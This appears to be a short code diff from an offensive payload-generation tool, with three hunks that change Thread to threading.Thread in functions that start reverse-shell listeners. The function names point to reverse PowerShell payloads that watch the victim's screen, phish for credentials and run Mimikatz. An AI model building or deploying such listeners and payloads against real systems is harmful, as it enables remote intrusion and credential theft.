@@ -123,7 +123,7 @@ def reversePowerShellWatchScreenGeneration(payloadchoice,payloadname):
     checkClientUpload(payloadname,powershellExec,isExe=False)
     from listener import Server
     listenerserver = Server('0.0.0.0', int(portnum), bindsocket=True)
-    listenerworker = Thread(target=asyncore.loop, args=(0.1,))
+    listenerworker = threading.Thread(target=asyncore.loop, args=(0.1,))
     listenerworker.setDaemon(True)
     listenerworker.start()
     print 'waiting for connection...\nCTRL + C when done\n'
@@ -148,7 +148,7 @@ def reversePowerShellAskCredsGeneration(payloadchoice,payloadname):
     checkClientUpload(payloadname,powershellExec,isExe=False)
     from listener import Server
     listenerserver = Server('0.0.0.0', int(portnum), bindsocket=True)
-    listenerworker = Thread(target=asyncore.loop, args=(0.1,))
+    listenerworker = threading.Thread(target=asyncore.loop, args=(0.1,))
     listenerworker.setDaemon(True)
     listenerworker.start()
     print 'waiting for connection...\nCTRL + C when done\n'
@@ -172,7 +172,7 @@ def reversePowerShellInvokeMimikatzGeneration(payloadchoice,payloadname):
     checkClientUpload(payloadname,powershellExec,isExe=False)
     from listener import Server
     listenerserver = Server('0.0.0.0', int(portnum), bindsocket=True)
-    listenerworker = Thread(target=asyncore.loop, args=(0.1,))
+    listenerworker = threading.Thread(target=asyncore.loop, args=(0.1,))
     listenerworker.setDaemon(True)
     listenerworker.start()
     print 'waiting for connection...\nCTRL + C when done\n'
